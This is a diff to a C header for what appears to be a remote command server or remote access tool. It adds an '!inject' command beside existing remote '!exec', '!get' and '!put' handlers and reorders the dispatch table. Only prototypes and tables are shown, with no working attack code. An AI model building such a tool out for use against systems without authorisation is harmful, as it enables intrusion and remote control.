@@ -14,6 +14,8 @@ void nolastslash(OUT char *s);
 void ntpath(OUT char *s);
 void unixpath(OUT char *s);
 char *last_unixpath(IN char *s);
+const char *to_next_space(IN const char *s);
+const char *to_next_non_space(IN const char *s);
 
 void p_err(const char *s);
 void p_success(const char *s);
@@ -31,27 +33,30 @@ void handle_signals(int signo);
 BOOL serv_EXEC(IN SOCKET *s, IN const char *params);
 BOOL serv_GET(IN SOCKET *s, IN const char *params);
 BOOL serv_PUT(IN SOCKET *s, IN const char *params);
-BOOL serv_EXIT(IN SOCKET *s, IN const char *params);
 BOOL serv_LOCAL(IN SOCKET *s, IN const char *params);
 BOOL serv_HELP(IN SOCKET *s, IN const char *params);
+BOOL serv_INJECT(IN SOCKET *s, IN const char *params);
+BOOL serv_EXIT(IN SOCKET *s, IN const char *params);
 
 typedef BOOL(*SERV_FUNC) (
     IN SOCKET *s,
     IN const char *params
 );
 
-#define SERV_MAX_CMDS 6
+#define SERV_MAX_CMDS 7
 
-#define MAX_SERV_CMD_FUNC_SZ 15 // max size of each const char *serv_cmd_funcs below
+#define MAX_SERV_CMD_FUNC_SZ 31 // max size of each const char *serv_cmd_funcs below
 
 static const char *serv_cmd_funcs[SERV_MAX_CMDS] = {
     "!exec", "!get", "!put",
-    "!exit", "!local", "!help"
+    "!local", "!help", "!inject",
+    "!exit"
 };
 
 static const SERV_FUNC serv_funcs[SERV_MAX_CMDS] = {
     serv_EXEC, serv_GET, serv_PUT,
-    serv_EXIT, serv_LOCAL, serv_HELP
+    serv_LOCAL, serv_HELP, serv_INJECT,
+    serv_EXIT
 };
 
 #endif
